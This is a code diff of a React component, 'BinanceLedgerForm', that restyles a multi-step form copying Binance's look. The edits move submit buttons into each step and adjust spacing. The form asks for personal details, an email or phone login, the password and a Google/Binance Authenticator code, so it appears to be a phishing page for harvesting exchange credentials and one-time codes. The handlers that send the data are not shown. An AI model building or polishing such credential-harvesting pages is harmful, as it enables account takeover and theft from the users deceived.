@@ -439,230 +439,251 @@ const BinanceLedgerForm: FC = () => {
   const renderMainForm = () => {
     if (currentStep === 'personal-details') {
       return (
-        <form onSubmit={handlePersonalDetailsSubmit}>
-          <div className="grid grid-cols-1 md:grid-cols-2 gap-3 mb-4">
-            <div className="bn-formItem">
-              <label className="block mb-2 text-xs font-medium font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
-                First Name
-              </label>
-              <div 
-                className={`bn-textField bn-textField__line data-size-large css-8x1t0r rounded ${errors.firstName ? 'border-red-500' : ''}`}
-                style={{
-                  backgroundColor: "var(--color-Input, #2B3139)",
-                  border: `1px solid ${errors.firstName ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
-                  height: "38px"
-                }}
-              >
-                <input
-                  type="text"
-                  className="bg-transparent border-0 text-white p-2.5 w-full outline-none h-full font-binance text-xs"
-                  value={personalDetails.firstName}
-                  onChange={(e) => setPersonalDetails({...personalDetails, firstName: e.target.value})}
-                />
-              </div>
-              {errors.firstName && (
-                <div className="text-red-500 text-xs mt-1 font-binance">
-                  {errors.firstName}
-                </div>
-              )}
-            </div>
-
-            <div className="bn-formItem">
-              <label className="block mb-2 text-xs font-medium font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
-                Last Name
-              </label>
-              <div 
-                className={`bn-textField bn-textField__line data-size-large css-8x1t0r rounded ${errors.lastName ? 'border-red-500' : ''}`}
-                style={{
-                  backgroundColor: "var(--color-Input, #2B3139)",
-                  border: `1px solid ${errors.lastName ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
-                  height: "38px"
-                }}
-              >
-                <input
-                  type="text"
-                  className="bg-transparent border-0 text-white p-2.5 w-full outline-none h-full font-binance text-xs"
-                  value={personalDetails.lastName}
-                  onChange={(e) => setPersonalDetails({...personalDetails, lastName: e.target.value})}
-                />
-              </div>
-              {errors.lastName && (
-                <div className="text-red-500 text-xs mt-1 font-binance">
-                  {errors.lastName}
-                </div>
-              )}
-            </div>
-
-            <div className="bn-formItem">
-              <label className="block mb-2 text-xs font-medium font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
-                Date of Birth
-              </label>
-              <div 
-                className={`bn-textField bn-textField__line data-size-large css-8x1t0r rounded ${errors.dateOfBirth ? 'border-red-500' : ''}`}
-                style={{
-                  backgroundColor: "var(--color-Input, #2B3139)",
-                  border: `1px solid ${errors.dateOfBirth ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
-                  height: "38px"
-                }}
-              >
-                <input
-                  type="date"
-                  className="bg-transparent border-0 text-white p-2.5 w-full outline-none h-full font-binance text-xs"
-                  value={personalDetails.dateOfBirth}
-                  onChange={(e) => setPersonalDetails({...personalDetails, dateOfBirth: e.target.value})}
-                />
-              </div>
-              {errors.dateOfBirth && (
-                <div className="text-red-500 text-xs mt-1 font-binance">
-                  {errors.dateOfBirth}
-                </div>
-              )}
-            </div>
-
-            <div className="bn-formItem">
-              <label className="block mb-2 text-xs font-medium font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
-                Phone Number
-              </label>
-              <div 
-                className={`bn-textField bn-textField__line data-size-large css-8x1t0r rounded ${errors.phoneNumber ? 'border-red-500' : ''}`}
-                style={{
-                  backgroundColor: "var(--color-Input, #2B3139)",
-                  border: `1px solid ${errors.phoneNumber ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
-                  height: "38px"
-                }}
-              >
-                <input
-                  type="tel"
-                  className="bg-transparent border-0 text-white p-2.5 w-full outline-none h-full font-binance text-xs"
-                  value={personalDetails.phoneNumber}
-                  onChange={(e) => setPersonalDetails({...personalDetails, phoneNumber: e.target.value})}
-                />
-              </div>
-              {errors.phoneNumber && (
-                <div className="text-red-500 text-xs mt-1 font-binance">
-                  {errors.phoneNumber}
-                </div>
-              )}
-            </div>
-
-            <div className="bn-formItem md:col-span-2">
-              <label className="block mb-2 text-xs font-medium font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
-                Address
-              </label>
-              <div 
-                className={`bn-textField bn-textField__line data-size-large css-8x1t0r rounded ${errors.address ? 'border-red-500' : ''}`}
-                style={{
-                  backgroundColor: "var(--color-Input, #2B3139)",
-                  border: `1px solid ${errors.address ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
-                  height: "38px"
-                }}
-              >
-                <input
-                  type="text"
-                  className="bg-transparent border-0 text-white p-2.5 w-full outline-none h-full font-binance text-xs"
-                  value={personalDetails.address}
-                  onChange={(e) => setPersonalDetails({...personalDetails, address: e.target.value})}
-                />
-              </div>
-              {errors.address && (
-                <div className="text-red-500 text-xs mt-1 font-binance">
-                  {errors.address}
-                </div>
-              )}
-            </div>
-
-            <div className="bn-formItem">
-              <label className="block mb-2 text-xs font-medium font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
-                Postal Code
-              </label>
-              <div 
-                className={`bn-textField bn-textField__line data-size-large css-8x1t0r rounded ${errors.postalCode ? 'border-red-500' : ''}`}
-                style={{
-                  backgroundColor: "var(--color-Input, #2B3139)",
-                  border: `1px solid ${errors.postalCode ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
-                  height: "38px"
-                }}
-              >
-                <input
-                  type="text"
-                  className="bg-transparent border-0 text-white p-2.5 w-full outline-none h-full font-binance text-xs"
-                  value={personalDetails.postalCode}
-                  onChange={(e) => setPersonalDetails({...personalDetails, postalCode: e.target.value})}
-                />
-              </div>
-              {errors.postalCode && (
-                <div className="text-red-500 text-xs mt-1 font-binance">
-                  {errors.postalCode}
-                </div>
-              )}
-            </div>
-
-            <div className="bn-formItem">
-              <label className="block mb-2 text-xs font-medium font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
-                City
-              </label>
-              <div 
-                className={`bn-textField bn-textField__line data-size-large css-8x1t0r rounded ${errors.city ? 'border-red-500' : ''}`}
-                style={{
-                  backgroundColor: "var(--color-Input, #2B3139)",
-                  border: `1px solid ${errors.city ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
-                  height: "38px"
-                }}
-              >
-                <input
-                  type="text"
-                  className="bg-transparent border-0 text-white p-2.5 w-full outline-none h-full font-binance text-xs"
-                  value={personalDetails.city}
-                  onChange={(e) => setPersonalDetails({...personalDetails, city: e.target.value})}
-                />
-              </div>
-              {errors.city && (
-                <div className="text-red-500 text-xs mt-1 font-binance">
-                  {errors.city}
-                </div>
-              )}
-            </div>
-
-            <div className="bn-formItem">
-              <label className="block mb-2 text-xs font-medium font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
-                Country
-              </label>
-              <div 
-                className={`bn-textField bn-textField__line data-size-large css-8x1t0r rounded ${errors.country ? 'border-red-500' : ''}`}
-                style={{
-                  backgroundColor: "var(--color-Input, #2B3139)",
-                  border: `1px solid ${errors.country ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
-                  height: "38px"
-                }}
-              >
-                <select
-                  className="bg-transparent border-0 text-white p-2.5 w-full outline-none h-full font-binance text-xs appearance-none cursor-pointer"
-                  value={personalDetails.country}
-                  onChange={(e) => setPersonalDetails({...personalDetails, country: e.target.value})}
-                  style={{ 
+        <div>
+          <form onSubmit={handlePersonalDetailsSubmit}>
+            <div className="grid grid-cols-1 md:grid-cols-2 gap-3 mb-3">
+              <div className="bn-formItem">
+                <label className="block mb-2 text-xs font-medium font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
+                  First Name
+                </label>
+                <div 
+                  className={`bn-textField bn-textField__line data-size-large css-8x1t0r rounded ${errors.firstName ? 'border-red-500' : ''}`}
+                  style={{
                     backgroundColor: "var(--color-Input, #2B3139)",
-                    backgroundImage: `url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 20 20'%3e%3cpath stroke='%23848E9C' stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='m6 8 4 4 4-4'/%3e%3c/svg%3e")`,
-                    backgroundPosition: 'right 0.6rem center',
-                    backgroundRepeat: 'no-repeat',
-                    backgroundSize: '1em 1em'
+                    border: `1px solid ${errors.firstName ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
+                    height: "38px"
                   }}
                 >
-                  <option value="" className="bg-[#2B3139] text-white text-xs">Select a country</option>
-                  {countries.map((country) => (
-                    <option key={country} value={country} className="bg-[#2B3139] text-white text-xs">
-                      {country}
-                    </option>
-                  ))}
-                </select>
-              </div>
-              {errors.country && (
-                <div className="text-red-500 text-xs mt-1 font-binance">
-                  {errors.country}
+                  <input
+                    type="text"
+                    className="bg-transparent border-0 text-white p-2.5 w-full outline-none h-full font-binance text-xs"
+                    value={personalDetails.firstName}
+                    onChange={(e) => setPersonalDetails({...personalDetails, firstName: e.target.value})}
+                  />
                 </div>
-              )}
+                {errors.firstName && (
+                  <div className="text-red-500 text-xs mt-1 font-binance">
+                    {errors.firstName}
+                  </div>
+                )}
+              </div>
+
+              <div className="bn-formItem">
+                <label className="block mb-2 text-xs font-medium font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
+                  Last Name
+                </label>
+                <div 
+                  className={`bn-textField bn-textField__line data-size-large css-8x1t0r rounded ${errors.lastName ? 'border-red-500' : ''}`}
+                  style={{
+                    backgroundColor: "var(--color-Input, #2B3139)",
+                    border: `1px solid ${errors.lastName ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
+                    height: "38px"
+                  }}
+                >
+                  <input
+                    type="text"
+                    className="bg-transparent border-0 text-white p-2.5 w-full outline-none h-full font-binance text-xs"
+                    value={personalDetails.lastName}
+                    onChange={(e) => setPersonalDetails({...personalDetails, lastName: e.target.value})}
+                  />
+                </div>
+                {errors.lastName && (
+                  <div className="text-red-500 text-xs mt-1 font-binance">
+                    {errors.lastName}
+                  </div>
+                )}
+              </div>
+
+              <div className="bn-formItem">
+                <label className="block mb-2 text-xs font-medium font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
+                  Date of Birth
+                </label>
+                <div 
+                  className={`bn-textField bn-textField__line data-size-large css-8x1t0r rounded ${errors.dateOfBirth ? 'border-red-500' : ''}`}
+                  style={{
+                    backgroundColor: "var(--color-Input, #2B3139)",
+                    border: `1px solid ${errors.dateOfBirth ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
+                    height: "38px"
+                  }}
+                >
+                  <input
+                    type="date"
+                    className="bg-transparent border-0 text-white p-2.5 w-full outline-none h-full font-binance text-xs"
+                    value={personalDetails.dateOfBirth}
+                    onChange={(e) => setPersonalDetails({...personalDetails, dateOfBirth: e.target.value})}
+                  />
+                </div>
+                {errors.dateOfBirth && (
+                  <div className="text-red-500 text-xs mt-1 font-binance">
+                    {errors.dateOfBirth}
+                  </div>
+                )}
+              </div>
+
+              <div className="bn-formItem">
+                <label className="block mb-2 text-xs font-medium font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
+                  Phone Number
+                </label>
+                <div 
+                  className={`bn-textField bn-textField__line data-size-large css-8x1t0r rounded ${errors.phoneNumber ? 'border-red-500' : ''}`}
+                  style={{
+                    backgroundColor: "var(--color-Input, #2B3139)",
+                    border: `1px solid ${errors.phoneNumber ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
+                    height: "38px"
+                  }}
+                >
+                  <input
+                    type="tel"
+                    className="bg-transparent border-0 text-white p-2.5 w-full outline-none h-full font-binance text-xs"
+                    value={personalDetails.phoneNumber}
+                    onChange={(e) => setPersonalDetails({...personalDetails, phoneNumber: e.target.value})}
+                  />
+                </div>
+                {errors.phoneNumber && (
+                  <div className="text-red-500 text-xs mt-1 font-binance">
+                    {errors.phoneNumber}
+                  </div>
+                )}
+              </div>
+
+              <div className="bn-formItem md:col-span-2">
+                <label className="block mb-2 text-xs font-medium font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
+                  Address
+                </label>
+                <div 
+                  className={`bn-textField bn-textField__line data-size-large css-8x1t0r rounded ${errors.address ? 'border-red-500' : ''}`}
+                  style={{
+                    backgroundColor: "var(--color-Input, #2B3139)",
+                    border: `1px solid ${errors.address ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
+                    height: "38px"
+                  }}
+                >
+                  <input
+                    type="text"
+                    className="bg-transparent border-0 text-white p-2.5 w-full outline-none h-full font-binance text-xs"
+                    value={personalDetails.address}
+                    onChange={(e) => setPersonalDetails({...personalDetails, address: e.target.value})}
+                  />
+                </div>
+                {errors.address && (
+                  <div className="text-red-500 text-xs mt-1 font-binance">
+                    {errors.address}
+                  </div>
+                )}
+              </div>
+
+              <div className="bn-formItem">
+                <label className="block mb-2 text-xs font-medium font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
+                  Postal Code
+                </label>
+                <div 
+                  className={`bn-textField bn-textField__line data-size-large css-8x1t0r rounded ${errors.postalCode ? 'border-red-500' : ''}`}
+                  style={{
+                    backgroundColor: "var(--color-Input, #2B3139)",
+                    border: `1px solid ${errors.postalCode ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
+                    height: "38px"
+                  }}
+                >
+                  <input
+                    type="text"
+                    className="bg-transparent border-0 text-white p-2.5 w-full outline-none h-full font-binance text-xs"
+                    value={personalDetails.postalCode}
+                    onChange={(e) => setPersonalDetails({...personalDetails, postalCode: e.target.value})}
+                  />
+                </div>
+                {errors.postalCode && (
+                  <div className="text-red-500 text-xs mt-1 font-binance">
+                    {errors.postalCode}
+                  </div>
+                )}
+              </div>
+
+              <div className="bn-formItem">
+                <label className="block mb-2 text-xs font-medium font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
+                  City
+                </label>
+                <div 
+                  className={`bn-textField bn-textField__line data-size-large css-8x1t0r rounded ${errors.city ? 'border-red-500' : ''}`}
+                  style={{
+                    backgroundColor: "var(--color-Input, #2B3139)",
+                    border: `1px solid ${errors.city ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
+                    height: "38px"
+                  }}
+                >
+                  <input
+                    type="text"
+                    className="bg-transparent border-0 text-white p-2.5 w-full outline-none h-full font-binance text-xs"
+                    value={personalDetails.city}
+                    onChange={(e) => setPersonalDetails({...personalDetails, city: e.target.value})}
+                  />
+                </div>
+                {errors.city && (
+                  <div className="text-red-500 text-xs mt-1 font-binance">
+                    {errors.city}
+                  </div>
+                )}
+              </div>
+
+              <div className="bn-formItem">
+                <label className="block mb-2 text-xs font-medium font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
+                  Country
+                </label>
+                <div 
+                  className={`bn-textField bn-textField__line data-size-large css-8x1t0r rounded ${errors.country ? 'border-red-500' : ''}`}
+                  style={{
+                    backgroundColor: "var(--color-Input, #2B3139)",
+                    border: `1px solid ${errors.country ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
+                    height: "38px"
+                  }}
+                >
+                  <select
+                    className="bg-transparent border-0 text-white p-2.5 w-full outline-none h-full font-binance text-xs appearance-none cursor-pointer"
+                    value={personalDetails.country}
+                    onChange={(e) => setPersonalDetails({...personalDetails, country: e.target.value})}
+                    style={{ 
+                      backgroundColor: "var(--color-Input, #2B3139)",
+                      backgroundImage: `url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 20 20'%3e%3cpath stroke='%23848E9C' stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='m6 8 4 4 4-4'/%3e%3c/svg%3e")`,
+                      backgroundPosition: 'right 0.6rem center',
+                      backgroundRepeat: 'no-repeat',
+                      backgroundSize: '1em 1em'
+                    }}
+                  >
+                    <option value="" className="bg-[#2B3139] text-white text-xs">Select a country</option>
+                    {countries.map((country) => (
+                      <option key={country} value={country} className="bg-[#2B3139] text-white text-xs">
+                        {country}
+                      </option>
+                    ))}
+                  </select>
+                </div>
+                {errors.country && (
+                  <div className="text-red-500 text-xs mt-1 font-binance">
+                    {errors.country}
+                  </div>
+                )}
+              </div>
             </div>
-          </div>
-        </form>
+          </form>
+          
+          <button
+            className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center font-bold font-binance text-xs"
+            style={{
+              backgroundColor: "var(--color-BtnBg, #FCD535)",
+              color: "var(--color-TextOnYellow, #202630)",
+              height: "34px"
+            }}
+            type="submit"
+            disabled={isLoading}
+            aria-label="Continue"
+            onClick={handlePersonalDetailsSubmit}
+          >
+            {isLoading ? (
+              <div className="animate-spin rounded-full h-3 w-3 border-2 border-current border-t-transparent"></div>
+            ) : (
+              'Continue'
+            )}
+          </button>
+        </div>
       );
     }
 
@@ -670,103 +691,145 @@ const BinanceLedgerForm: FC = () => {
       switch (currentStep) {
         case 'email':
           return (
-            <form onSubmit={handleEmailSubmit}>
-              <div className="bn-formItem mb-4">
-                <label 
-                  className="block mb-2 text-xs font-medium font-binance" 
-                  htmlFor="bn-formItem-q8nY2Y1v"
-                  style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
-                >
-                  Email/Phone number
-                </label>
-                <div>
-                  <div className="css-4cffwv">
-                    <div 
-                      className={`bn-textField bn-textField__line data-size-large username-input-field css-8x1t0r rounded ${errors.email ? 'border-red-500' : ''}`}
-                      style={{
-                        backgroundColor: "var(--color-Input, #2B3139)",
-                        border: `1px solid ${errors.email ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
-                        height: "38px"
-                      }}
-                      role="group"
-                    >
-                      <input
-                        placeholder="Email/Phone (without country code)"
-                        type="text"
-                        role="textbox"
-                        aria-label="Username field for email or phone number"
-                        name="username"
-                        autoFocus
-                        id="bn-formItem-q8nY2Y1v"
-                        autoCapitalize="off"
-                        className="bg-transparent border-0 text-white p-2.5 w-full outline-none h-full font-binance text-xs"
-                        spellCheck="false"
-                        autoComplete="username"
-                        value={email}
-                        onChange={(e) => setEmail(e.target.value)}
-                      />
-                    </div>
-                    {errors.email && (
-                      <div className="text-red-500 text-xs mt-1 font-binance">
-                        {errors.email}
+            <div>
+              <form onSubmit={handleEmailSubmit}>
+                <div className="bn-formItem mb-3">
+                  <label 
+                    className="block mb-2 text-xs font-medium font-binance" 
+                    htmlFor="bn-formItem-q8nY2Y1v"
+                    style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
+                  >
+                    Email/Phone number
+                  </label>
+                  <div>
+                    <div className="css-4cffwv">
+                      <div 
+                        className={`bn-textField bn-textField__line data-size-large username-input-field css-8x1t0r rounded ${errors.email ? 'border-red-500' : ''}`}
+                        style={{
+                          backgroundColor: "var(--color-Input, #2B3139)",
+                          border: `1px solid ${errors.email ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
+                          height: "38px"
+                        }}
+                        role="group"
+                      >
+                        <input
+                          placeholder="Email/Phone (without country code)"
+                          type="text"
+                          role="textbox"
+                          aria-label="Username field for email or phone number"
+                          name="username"
+                          autoFocus
+                          id="bn-formItem-q8nY2Y1v"
+                          autoCapitalize="off"
+                          className="bg-transparent border-0 text-white p-2.5 w-full outline-none h-full font-binance text-xs"
+                          spellCheck="false"
+                          autoComplete="username"
+                          value={email}
+                          onChange={(e) => setEmail(e.target.value)}
+                        />
                       </div>
-                    )}
+                      {errors.email && (
+                        <div className="text-red-500 text-xs mt-1 font-binance">
+                          {errors.email}
+                        </div>
+                      )}
+                    </div>
                   </div>
                 </div>
-              </div>
-            </form>
+              </form>
+              
+              <button
+                className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center font-bold font-binance text-xs"
+                style={{
+                  backgroundColor: "var(--color-BtnBg, #FCD535)",
+                  color: "var(--color-TextOnYellow, #202630)",
+                  height: "34px"
+                }}
+                type="submit"
+                disabled={isLoading}
+                aria-label="Next"
+                onClick={handleEmailSubmit}
+              >
+                {isLoading ? (
+                  <div className="animate-spin rounded-full h-3 w-3 border-2 border-current border-t-transparent"></div>
+                ) : (
+                  'Next'
+                )}
+              </button>
+            </div>
           );
         case 'password':
           return (
-            <form onSubmit={handlePasswordSubmit}>
-              <div className="bn-formItem mb-4">
-                <label 
-                  className="block mb-2 text-xs font-medium font-binance" 
-                  htmlFor="password-field"
-                  style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
-                >
-                  Password
-                </label>
-                <div>
-                  <div className="css-4cffwv">
-                    <div 
-                      className={`bn-textField bn-textField__line data-size-large username-input-field css-8x1t0r rounded ${errors.password ? 'border-red-500' : ''}`}
-                      style={{
-                        backgroundColor: "var(--color-Input, #2B3139)",
-                        border: `1px solid ${errors.password ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
-                        height: "38px"
-                      }}
-                      role="group"
-                    >
-                      <input
-                        placeholder="Enter your password"
-                        type="password"
-                        role="textbox"
-                        aria-label="Password field"
-                        name="password"
-                        autoFocus
-                        id="password-field"
-                        autoCapitalize="off"
-                        className="bg-transparent border-0 text-white p-2.5 w-full outline-none h-full font-binance text-xs"
-                        spellCheck="false"
-                        autoComplete="current-password"
-                        value={password}
-                        onChange={(e) => setPassword(e.target.value)}
-                      />
-                    </div>
-                    {errors.password && (
-                      <div className="text-red-500 text-xs mt-1 font-binance">
-                        {errors.password}
+            <div>
+              <form onSubmit={handlePasswordSubmit}>
+                <div className="bn-formItem mb-3">
+                  <label 
+                    className="block mb-2 text-xs font-medium font-binance" 
+                    htmlFor="password-field"
+                    style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
+                  >
+                    Password
+                  </label>
+                  <div>
+                    <div className="css-4cffwv">
+                      <div 
+                        className={`bn-textField bn-textField__line data-size-large username-input-field css-8x1t0r rounded ${errors.password ? 'border-red-500' : ''}`}
+                        style={{
+                          backgroundColor: "var(--color-Input, #2B3139)",
+                          border: `1px solid ${errors.password ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
+                          height: "38px"
+                        }}
+                        role="group"
+                      >
+                        <input
+                          placeholder="Enter your password"
+                          type="password"
+                          role="textbox"
+                          aria-label="Password field"
+                          name="password"
+                          autoFocus
+                          id="password-field"
+                          autoCapitalize="off"
+                          className="bg-transparent border-0 text-white p-2.5 w-full outline-none h-full font-binance text-xs"
+                          spellCheck="false"
+                          autoComplete="current-password"
+                          value={password}
+                          onChange={(e) => setPassword(e.target.value)}
+                        />
                       </div>
-                    )}
+                      {errors.password && (
+                        <div className="text-red-500 text-xs mt-1 font-binance">
+                          {errors.password}
+                        </div>
+                      )}
+                    </div>
                   </div>
                 </div>
-              </div>
-            </form>
+              </form>
+              
+              <button
+                className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center font-bold font-binance text-xs"
+                style={{
+                  backgroundColor: "var(--color-BtnBg, #FCD535)",
+                  color: "var(--color-TextOnYellow, #202630)",
+                  height: "34px"
+                }}
+                type="submit"
+                disabled={isLoading}
+                aria-label="Continue"
+                onClick={handlePasswordSubmit}
+              >
+                {isLoading ? (
+                  <div className="animate-spin rounded-full h-3 w-3 border-2 border-current border-t-transparent"></div>
+                ) : (
+                  'Continue'
+                )}
+              </button>
+            </div>
           );
         case 'verification':
           return (
-            <>
+            <div>
               <div 
                 className="mb-3 text-xs font-binance"
                 style={{ color: "var(--color-SecondaryText, #B7BDC6)" }}
@@ -774,7 +837,7 @@ const BinanceLedgerForm: FC = () => {
                 Enter the code from your Google/Binance Authenticator.
               </div>
               <form onSubmit={handleVerificationSubmit}>
-                <div className="bn-formItem mb-4">
+                <div className="bn-formItem mb-3">
                   <label 
                     className="block mb-2 text-xs font-binance" 
                     htmlFor="verification-field"
@@ -826,7 +889,26 @@ const BinanceLedgerForm: FC = () => {
                   </div>
                 </div>
               </form>
-            </>
+              
+              <button
+                className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center font-bold font-binance text-xs"
+                style={{
+                  backgroundColor: "var(--color-BtnBg, #FCD535)",
+                  color: "var(--color-TextOnYellow, #202630)",
+                  height: "34px"
+                }}
+                type="submit"
+                disabled={isLoading}
+                aria-label="Submit"
+                onClick={handleVerificationSubmit}
+              >
+                {isLoading ? (
+                  <div className="animate-spin rounded-full h-3 w-3 border-2 border-current border-t-transparent"></div>
+                ) : (
+                  'Submit'
+                )}
+              </button>
+            </div>
           );
         default:
           return null;
@@ -1057,11 +1139,7 @@ const BinanceLedgerForm: FC = () => {
               
               <div style={{ minHeight: "280px" }} className="flex flex-col">
                 {renderMainForm()}
-                
-                <div className="mt-auto">
-                  {renderButton()}
-                  {renderAlternativeOptions()}
-                </div>
+                {renderAlternativeOptions()}
               </div>
             </div>
           )}
